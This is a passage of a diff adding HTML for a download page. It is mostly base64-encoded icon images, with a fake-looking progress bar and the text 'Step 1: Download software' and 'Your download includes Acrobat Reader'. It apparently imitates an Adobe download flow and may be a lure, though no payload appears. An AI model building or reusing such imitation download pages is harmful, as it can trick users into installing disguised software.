+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbYAAAHCCAYAAACDuuynAAAACXBIWXMAAC4jAAAuIwF4pT92AAAGOWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNy4xLWMwMDAgNzkuOWNjYzRkZTkzLCAyMDIyLzAzLzE0LTE0OjA3OjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjMuMyAoTWFjaW50b3NoKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjItMDYtMDdUMTU6NDM6NTkrMDU6MzAiIHhtcDpNb2RpZnlEYXRlPSIyMDIyLTA2LTA4VDE4OjA3OjE4KzA1OjMwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIyLTA2LTA4VDE4OjA3OjE4KzA1OjMwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDplNTQzN2MzNS1kMmUzLTRiZjYtYWUxMy04OWRmZmM4YzE2NmEiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDpiMGJiMTJlZS05MzBjLWVkNDktYWI1Mi0wNjZhMTBlNDY5MDgiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoxOGJjZGFiZC1mYjMzLTQyYmMtODFiMC00MTI1Y2JjMmY0ZWUiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjE4YmNkYWJkLWZiMzMtNDJiYy04MWIwLTQxMjVjYmMyZjRlZSIgc3RFdnQ6d2hlbj0iMjAyMi0wNi0wN1QxNTo0Mzo1OSswNTozMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIzLjMgKE1hY2ludG9zaCkiLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNvbnZlcnRlZCIgc3RFdnQ6cGFyYW1ldGVycz0iZnJvbSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ZTU0MzdjMzUtZDJlMy00YmY2LWFlMTMtODlkZmZjOGMxNjZhIiBzdEV2dDp3aGVuPSIyMDIyLTA2LTA4VDE4OjA3OjE4KzA1OjMwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjMuMyAoTWFjaW50b3NoKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5zsxQ3AAAYFUlEQVR42u3dwYtm2VnH8foT6k+oP6G2Y4zWdE/PtLopEDG77mwMiCG1ibMJoYYGN5JpCASSgJRiBmYh1CwEQRe1kSEyi8YJBCK0HULUkWBadAYUhdf36XlfrKmp6rr3vufee+5zPj/4bqa7q3ve7nu/dc55nufsrVarPQAAsuBDAAAQGwAAxAYA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" alt="Download Icon" style="width: 160px; height: 160px;">
+          </div>
+          
+          <div class="progress-section">
+            <div class="progress-info">
+              <span>Downloading...</span>
+              <span id="progress-percentage">0%</span>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-fill"></div>
+            </div>
+          </div>
+          
+          <h2>Step 1: Download software</h2>
+          <p>Your download includes Acrobat Reader.</p>
+          
+          <!-- Fallback download message - Always visible -->
+          
+        </div>
+        
+        <!-- Step 2 -->
+        <div class="step">
+          <div class="step-icon">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAqsAAAIhCAYAAABpMPNPAAAACXBIWXMAAC4jAAAuIwF4pT92AAAGOWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNy4xLWMwMDAgNzkuOWNjYzRkZTkzLCAyMDIyLzAzLzE0LTE0OjA3OjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjMuMyAoTWFjaW50b3NoKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjItMDYtMDdUMTU6NDM6NTkrMDU6MzAiIHhtcDpNb2RpZnlEYXRlPSIyMDIyLTA2LTA4VDE4OjIyOjQ1KzA1OjMwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIyLTA2LTA4VDE4OjIyOjQ1KzA1OjMwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDozNTJhOTI3Mi05YzUzLTQ4MWYtYjg0MC0zZjU2ZWMwYjQ4YjUiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDoxOGZhOWRiMC1lOGZjLTcyNDgtOTFiZi0wMzhkMmJhOGJkYTMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpjN2IzZTQ2OC1mMzA1LTQyNjMtYjc2OS0zM2Q0NmYzNzk5ZjYiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmM3YjNlNDY4LWYzMDUtNDI2My1iNzY5LTMzZDQ2ZjM3OTlmNiIgc3RFdnQ6d2hlbj0iMjAyMi0wNi0wN1QxNTo0Mzo1OSswNTozMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIzLjMgKE1hY2ludG9zaCkiLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNvbnZlcnRlZCIgc3RFdnQ6cGFyYW1ldGVycz0iZnJvbSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MzUyYTkyNzItOWM1My00ODFmLWI4NDAtM2Y1NmVjMGI0OGI1IiBzdEV2dDp3aGVuPSIyMDIyLTA2LTA4VDE4OjIyOjQ1KzA1OjMwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjMuMyAoTWFjaW50b3NoKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7L7oUyAAAVWUlEQVR42u3dP29b1+HH4bwEvgS9BK1NWoBxUdfwYhlB7CkxDdhLlEHQYCdTaBgQWiC2hmSw24FB0MLwENBDgQLJoCVQanRQ7c6GgE7anMFDB8u3PNJ1ISu2df+dw0Py+QLPUPyKVLmiqM+Puod8pyiKdwAAIEcuAgAAYhUAAMQqAABiFQAAxCoA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